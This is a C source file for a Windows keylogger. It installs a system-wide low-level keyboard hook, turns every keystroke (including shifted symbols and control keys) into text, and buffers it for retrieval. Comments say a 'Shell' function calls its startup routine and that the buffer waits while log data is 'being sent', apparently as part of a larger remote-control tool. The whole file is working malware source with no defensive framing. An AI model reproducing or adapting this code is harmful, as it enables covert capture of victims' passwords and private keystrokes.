/*
 * 
 *
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>
#include "UseTracker.h"

#define NAME "make_me_crazy"
#define buffSize 1024
#define tempBuffSize 18378

HHOOK ghHook = NULL; // NOTE - gh stands for global handle
HANDLE ghMutex = NULL;

HANDLE ghLogHeap = NULL;
PSTR pLogBuff = NULL; // pointer to a string, in this case, the key logger buffer
DWORD dwLogBuffSize = 0; // double word  - 32 bit unsigned integer, to hold size of key log buffer
DWORD dwLogBuffLength = 0;

HANDLE ghTempHeap = NULL;
PSTR pTempBuff = NULL;

HANDLE notWritingTemp = NULL;
HANDLE notSendingLog = NULL;
int tempBuffHasData = 0;


/* STARTUP FUNCTION
 * called by Shell function, defines variables & starts new thread for keylogging functions
 */
int make_me_crazy()
{

	// Check to see if keylogger already running, if it is, return an error value
	if((ghMutex = CreateMutex(NULL, TRUE, NAME)) == NULL)
	{
		return(-1);
	} 

	// automatically clean up memory at program termination
	atexit((VOID *)clean);
	
	// allocate two heaps for the keylogger to use
	ghLogHeap = HeapCreate(0, buffSize + 1, 0);
	pLogBuff = (PSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, buffSize + 1);
	dwLogBuffSize = buffSize + 1;

	ghTempHeap = HeapCreate(0, dwLogBuffSize, 0);
	pTempBuff = (PSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, tempBuffSize);

	// create events to handle multiple threads
	notSendingLog = CreateEvent(NULL, TRUE, TRUE, NULL);
	notWritingTemp = CreateEvent(NULL, TRUE, TRUE, NULL);

	// spawn a new thread for keylogging 
	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)eventsRec, NULL, 0, NULL) == NULL) 
	{
		return(-1);
	}

	return(0);
}


/* KEYLOG FUNCTION
 * record keystrokes when they happen, change event states to indicate new key presses
 */
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (HC_ACTION == nCode)
	{
		KBDLLHOOKSTRUCT *keyEvent = (KBDLLHOOKSTRUCT *)lParam;
		if (WM_KEYDOWN == wParam)
		{
			char key[2];
			DWORD keyCode = keyEvent->vkCode;
			int shift = GetAsyncKeyState(VK_SHIFT);

			if (keyCode >= 0x30 && keyCode <= 0x39)
			{
				if (shift)
				{
					switch (keyCode)
					{
						case 0x30:
							Log(')');
							break;
						case 0x31:
							Log('!');
							break;
						case 0x32:
							Log('@');
							break;
						case 0x33:
							Log('#');
							break;
						case 0x34:
							Log('$');
							break;
						case 0x35:
							Log('%');
							break;
						case 0x36:
							Log('^');
							break;
						case 0x37:
							Log('&');
							break;
						case 0x38:
							Log('*');
							break;
						case 0x39:
							Log('(');
							break;
					}
				}
				else
				{
					key[0] = (char)(keyCode);
					Log(*key);
				}
			} 
			else if (keyCode >= 0x41 && keyCode <= 0x5A)
			{
				if (shift)
					key[0] = (char)(keyCode);
				else
					key[0] = (char)(keyCode + 32);
				Log(*key);
			}
			else if (keyCode >=0x08 && keyCode <= 0x2F)
			{
				switch(keyCode)
				{
					case VK_SPACE:
						Log(' ');
						break;
					case VK_BACK:
						LogS("[BACKSP]");
						break;
					case VK_TAB:
						LogS("[TAB]");
						break;
					case VK_CONTROL:
						LogS("[CTRL]");
						break;
					case VK_MENU:
						LogS("[ALT]");
						break;
					case VK_CAPITAL:
						LogS("[CAPS]");
						break;
					case VK_DELETE:
						LogS("[DEL]");
						break;
				}
			}
			else
			{
				if (shift)
				{
					switch(keyCode) 
					{
						case VK_OEM_1:
							Log(':');
							break;
						case VK_OEM_PLUS:
							Log('+');
							break;
						case VK_OEM_COMMA:
							Log('<');
							break;
						case VK_OEM_MINUS:
							Log('_');
							break;
						case VK_OEM_PERIOD:
							Log('>');
							break;
						case VK_OEM_2:
							Log('?');
							break;
						case VK_OEM_3:
							Log('~');
							break;
						case VK_OEM_4:
							Log('{');
							break;
						case VK_OEM_5:
							Log('|');
							break;
						case VK_OEM_6:
							Log('}');
							break;
						case VK_OEM_7:
							Log('"');
							break;
					}
				}
				else
				{
					switch(keyCode) 
					{
						case VK_OEM_1:
							Log(';');
							break;
						case VK_OEM_PLUS:
							Log('=');
							break;
						case VK_OEM_COMMA:
							Log(',');
							break;
						case VK_OEM_MINUS:
							Log('-');
							break;
						case VK_OEM_PERIOD:
							Log('.');
							break;
						case VK_OEM_2:
							Log('/');
							break;
						case VK_OEM_3:
							Log('`');
							break;
						case VK_OEM_4:
							Log('[');
							break;
						case VK_OEM_5:
							Log('\\');
							break;
						case VK_OEM_6:
							Log(']');
							break;
						case VK_OEM_7:
							Log('\'');
							break;
					}
				}
			}
			
			ResetEvent(notWritingTemp);
			// if temporary buffer is full, clear it and continue recording
			if (strlen(pTempBuff) >= tempBuffSize - dwLogBuffLength)
			{
				ZeroMemory(pTempBuff, tempBuffSize);
				return CallNextHookEx(0, nCode, wParam, lParam);
			}
			
			// if data is being sent, wait for it to send before writing to Buffer 
			WaitForSingleObject(notSendingLog, INFINITE);

			strncpy(pTempBuff + strlen(pTempBuff), pLogBuff, dwLogBuffLength);
			tempBuffHasData = 1;
			SetEvent(notWritingTemp);

			// Zero Log Buffer after each keystroke is recorded
			ZeroMemory(pLogBuff, dwLogBuffLength);
			dwLogBuffLength = 0;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}


/** INSTALLS A HOOK PROCEDURE INTO A HOOK CHAIN - MONITORS CERTAIN THREADS FOR EVENTS
 * Type of hook procedure - monitoring low-level keyboard input
 * Pointer to hook procedure - points to a DLL procedure OR a hook procedure in process code
 * handle to DLL containing hook procedure pointed to by previous param OR NULL if thread is created by current process
 * thread identifier - if 0, associated with all existing threads
 * Returns: HHOOK (handle to hook procedure)
**/
void eventsRec()
{
	if ((ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0)) == NULL)
	{
		ExitProcess(1);
	}

	MSG msg;

	while (GetMessage(&msg, 0, 0, 0) !=  0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(ghHook);

}

PSTR getBuff()
{
	return pTempBuff;
}

void Log(char character)
{
	sprintf(pLogBuff + strlen(pLogBuff), "%c", character);
	dwLogBuffLength = strlen(pLogBuff);
}

void LogS(char* string)
{
	sprintf(pLogBuff + strlen(pLogBuff), "%s", string);
	dwLogBuffLength = strlen(pLogBuff);
}

void clean()
{
	if (pLogBuff && ghLogHeap)
	{
		HeapFree(ghLogHeap, 0, pLogBuff);
		HeapDestroy(ghLogHeap);
	}
	if (ghHook) UnhookWindowsHookEx(ghHook);
	if (ghMutex) CloseHandle(ghMutex);
	if (pTempBuff && ghTempHeap)
	{
		HeapFree(ghTempHeap, 0, pTempBuff);
		HeapDestroy(ghTempHeap);
	}
}
